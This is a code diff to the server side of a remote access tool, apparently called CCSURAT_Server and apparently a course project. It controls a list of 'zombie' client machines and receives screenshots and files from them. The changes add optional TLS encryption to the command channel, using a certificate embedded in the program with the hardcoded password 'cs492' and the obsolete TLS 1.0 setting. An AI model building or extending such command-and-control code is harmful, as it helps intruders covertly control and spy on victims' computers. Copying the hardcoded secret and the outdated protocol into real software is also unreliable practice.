@@ -5,7 +5,11 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
+using System.Net.Security;
 using System.Net.Sockets;
+using System.Reflection;
+using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -24,6 +28,13 @@ namespace CCSURAT_Server
         // Network
         private TcpClient client;
         private NetworkStream netStream;
+
+        // Security
+        private bool sslSecured = false;
+        private SslStream sslStream;
+        private X509Certificate serverCertificate;
+        private StreamWriter sw;
+        private StreamReader sr;
 
         #region Information
         // Details about the client or client's computer
@@ -55,6 +66,23 @@ namespace CCSURAT_Server
             this.zombieListView = mainForm.zombieListView;
             this.client = client;
             this.netStream = client.GetStream();
+            sslStream = new SslStream(netStream);
+
+            if (sslSecured)
+            {
+                // Build the server cert from resources
+                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CCSURAT_Server.Resources.Server.pfx");
+                byte[] bytes = new byte[stream.Length];
+                stream.Read(bytes, 0, bytes.Length);
+                serverCertificate = new X509Certificate2(bytes, "cs492");
+
+                sslStream.AuthenticateAsServer(serverCertificate, false, SslProtocols.Tls, false);
+
+                // Create stream writer/reader objects, could be used for easier read/write
+                sw = new StreamWriter(sslStream);
+                sr = new StreamReader(sslStream);
+            }
+
             this.active = true;
 
             // initialize monitor list
@@ -75,13 +103,14 @@ namespace CCSURAT_Server
             {
                 while (IsAlive() && IsActive())
                 {
-                    if (netStream.DataAvailable)
+                    if (sslSecured ? sslStream.CanRead : netStream.CanRead)
                     {
                         try {
                             byte[] bytes = new byte[1024];
                             string data = null;
                             int i;
-                            if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
+                            if ((i = sslSecured ? sslStream.Read(bytes, 0, bytes.Length) :
+                                                  netStream.Read(bytes, 0, bytes.Length)) != 0)
                             {
                                 // convert recieved bytes to string data
                                 data = Encoding.ASCII.GetString(bytes, 0, i);
@@ -145,7 +174,10 @@ namespace CCSURAT_Server
             {
                 // write empty buffer to client to check if connection is alive
                 byte[] empty = new byte[10];
-                netStream.Write(empty, 0, 0);
+                if (sslSecured)
+                    sslStream.Write(empty, 0, 0);
+                else
+                    netStream.Write(empty, 0, 0);
                 //GetPing();
                 //UpdatePing();
                 return true;
@@ -181,7 +213,7 @@ namespace CCSURAT_Server
                 }
                 catch (Exception ex)
                 {
-                    Log("PING ERROR: " + ex.StackTrace);
+                    //Log("PING ERROR: " + ex.StackTrace);
                 }
             }
         }
@@ -322,7 +354,10 @@ namespace CCSURAT_Server
             try {
                 // convert string data to byte array and write it to the stream
                 byte[] data = Encoding.ASCII.GetBytes(s);
-                netStream.Write(data, 0, data.Length);
+                if(sslSecured)
+                    sslStream.Write(data, 0, data.Length);
+                else
+                    netStream.Write(data, 0, data.Length);
                 if (!s.Contains("[[BINARY]]") && !s.Contains("[[SCREENSHOT]]"))
                     Log("Data sent: " + s);
             } catch(Exception ex)
